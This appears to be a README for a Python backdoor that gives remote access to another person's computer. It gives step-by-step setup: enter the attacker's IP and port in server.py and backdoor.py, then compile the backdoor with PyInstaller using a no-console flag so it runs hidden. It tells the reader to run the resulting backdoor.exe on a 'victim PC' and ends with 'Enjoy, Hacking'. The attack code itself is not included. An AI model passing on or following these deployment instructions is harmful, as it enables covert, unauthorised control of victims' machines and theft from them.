1 Download both these files or clone repository to a folder

2 Now you need to edit both the files 
  - In server.py at line 63 set the Ip of the attackers PC ,and then the port number as you like
  - In backdoor.py at line 27 set the same Ip and Port as the one set on the server.py

3 Then, you must compile the backdoor.py file using python

4 In Terminal or CMD at the downloaded folder use this code to compile:

>> pyinstaller backdoor.py --onefile --noconsole

5 Now there will be 2 folder and 1 file after compiling

6 Go to dist folder then there we can find backdoor.exe

7 This is the file you must use in a victim PC

8 Double click run the file on the Victims PC

9 Then from the attacker PC run the server.py file using VsCode or any other

10 Enjoy, Hacking 
